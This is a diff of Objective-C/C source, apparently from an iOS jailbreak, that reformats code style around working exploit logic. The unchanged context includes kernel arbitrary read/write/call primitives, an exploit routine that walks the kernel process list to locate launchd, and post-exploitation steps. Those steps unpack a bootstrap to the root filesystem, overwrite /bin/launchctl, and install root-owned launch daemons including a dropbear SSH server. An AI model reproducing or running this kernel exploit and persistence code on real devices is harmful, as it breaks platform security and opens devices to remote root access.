@@ -40,8 +40,7 @@ kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_
 kern_return_t mach_vm_protect(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, boolean_t set_maximum, vm_prot_t new_protection);
 kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
 
-uint32_t FuncAnywhere32(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2)
-{
+uint32_t FuncAnywhere32(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2) {
     return IOConnectTrap4(funcconn, 0, x1, x2, x0, addr);
 }
 
@@ -95,8 +94,7 @@ uint64_t WriteAnywhere32(uint64_t addr, uint32_t val) {
 
 #import "pte_stuff.h"
 
-void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
-{
+void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs) {
     io_iterator_t iterator;
     IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"), &iterator);
     io_object_t servicex = IOIteratorNext(iterator);
@@ -115,12 +113,13 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
             uint32_t pid = ReadAnywhere32(proc+0x10);
             if (pid == getpid()) {
                 bsd_task = proc;
-            } else
-                if (pid == 1) {
-                    launchd_task = proc;
-                }
+            } else if (pid == 1) {
+                launchd_task = proc;
+            }
             
-            if (launchd_task && bsd_task) break;
+            if (launchd_task && bsd_task) {
+                break;
+            }
             
             proc = ReadAnywhere64(proc);
         }
@@ -554,7 +553,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         uint64_t ends = whole_size - (endf - whole_base);
         uint32_t* opps_stream = whole_dump + endf - whole_base;
         uint64_t* ptr_stream = whole_dump + endf - whole_base;
-
+        
         uint64_t lastk = 0;
         int streak = 0;
         
@@ -581,7 +580,7 @@ remappage[remapcnt++] = (x & (~PMK));\
         
         
         if (streak == 9) {
-
+            
             
             char* sbstr = whole_dump + lastk + endf - whole_base - 8;
             
@@ -839,22 +838,17 @@ remappage[remapcnt++] = (x & (~PMK));\
     }
     
     {
-        char path[256];
-        uint32_t size = sizeof(path);
-        _NSGetExecutablePath(path, &size);
-        char* pt = realpath(path, 0);
-        
         {
             __block pid_t pd = 0;
-            NSString* execpath = [[NSString stringWithUTF8String:pt]  stringByDeletingLastPathComponent];
+            NSString *execpath = [NSBundle mainBundle].bundlePath;
             
             
             int f = open("/.installed_yaluX", O_RDONLY);
             
             if (f == -1) {
-                NSString* tar = [execpath stringByAppendingPathComponent:@"tar"];
-                NSString* bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
-                const char* jl = [tar UTF8String];
+                NSString *tar = [execpath stringByAppendingPathComponent:@"tar"];
+                NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
+                const char* jl = tar.UTF8String;
                 
                 unlink("/bin/tar");
                 unlink("/bin/launchctl");
@@ -865,13 +859,13 @@ remappage[remapcnt++] = (x & (~PMK));\
                 
                 chdir("/");
                 
-                posix_spawn(&pd, jl, 0, 0, (char**)&(const char*[]){jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL}, NULL);
+                posix_spawn(&pd, jl, 0, 0, (char**)&(const char*[]){jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", bootstrap.UTF8String, NULL}, NULL);
                 NSLog(@"pid = %x", pd);
                 waitpid(pd, 0, 0);
                 
                 
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
-                jl = [jlaunchctl UTF8String];
+                NSString *jlaunchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
+                jl = jlaunchctl.UTF8String;
                 
                 copyfile(jl, "/bin/launchctl", 0, COPYFILE_ALL);
                 chmod("/bin/launchctl", 0755);
@@ -886,34 +880,30 @@ remappage[remapcnt++] = (x & (~PMK));\
                 system("/usr/bin/uicache");
                 
                 system("killall -SIGSTOP cfprefsd");
-                NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
+                NSMutableDictionary* md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
                 
-                [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
+                [md setObject:@YES forKey:@"SBShowNonDefaultSystemApps"];
                 
                 [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
                 system("killall -9 cfprefsd");
                 
-            }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"reload"];
-                char* jl = [jlaunchctl UTF8String];
+
+                jlaunchctl = [execpath stringByAppendingPathComponent:@"reload"];
+                jl = jlaunchctl.UTF8String;
                 unlink("/usr/libexec/reload");
                 copyfile(jl, "/usr/libexec/reload", 0, COPYFILE_ALL);
                 chmod("/usr/libexec/reload", 0755);
                 chown("/usr/libexec/reload", 0, 0);
                 
-            }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"0.reload.plist"];
-                char* jl = [jlaunchctl UTF8String];
+                jlaunchctl = [execpath stringByAppendingPathComponent:@"0.reload.plist"];
+                jl = jlaunchctl.UTF8String;
                 unlink("/Library/LaunchDaemons/0.reload.plist");
                 copyfile(jl, "/Library/LaunchDaemons/0.reload.plist", 0, COPYFILE_ALL);
                 chmod("/Library/LaunchDaemons/0.reload.plist", 0644);
                 chown("/Library/LaunchDaemons/0.reload.plist", 0, 0);
-            }
-            {
-                NSString* jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
-                char* jl = [jlaunchctl UTF8String];
+
+                jlaunchctl = [execpath stringByAppendingPathComponent:@"dropbear.plist"];
+                jl = jlaunchctl.UTF8String;
                 unlink("/Library/LaunchDaemons/dropbear.plist");
                 copyfile(jl, "/Library/LaunchDaemons/dropbear.plist", 0, COPYFILE_ALL);
                 chmod("/Library/LaunchDaemons/dropbear.plist", 0644);
